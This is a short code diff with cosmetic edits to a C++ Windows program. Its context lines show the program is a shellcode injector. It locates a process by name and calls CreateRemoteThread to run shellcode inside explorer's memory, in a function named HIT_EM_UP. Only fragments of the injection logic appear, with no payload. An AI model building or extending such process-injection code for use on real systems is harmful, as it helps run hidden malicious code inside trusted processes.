@@ -14,7 +14,7 @@ DWORD FindProcessId(const char *processName, const size_t &procStrLen)
     return result;
   }
 
-  PROCESSENTRY32 pe32{};
+  PROCESSENTRY32 pe32{ };
   pe32.dwSize = sizeof(PROCESSENTRY32);
 
   // Retrieve information about the first process,
@@ -100,11 +100,11 @@ HIT_EM_UP {
     return EXIT_FAILURE;
   }
 
-  DWORD remoteThreadId{};
+  DWORD remoteThreadId{ };
   HANDLE hThread{CreateRemoteThread(hProcess, nullptr, 0,
                                     (LPTHREAD_START_ROUTINE)addr, nullptr, 0x4,
                                     &remoteThreadId)};
-  if (!hThread) {
+  if (hThread == NULL) {
     cout << "[-] failed to create shellcode thread in explorer's virtual "
             "memory\n";
     return EXIT_FAILURE;
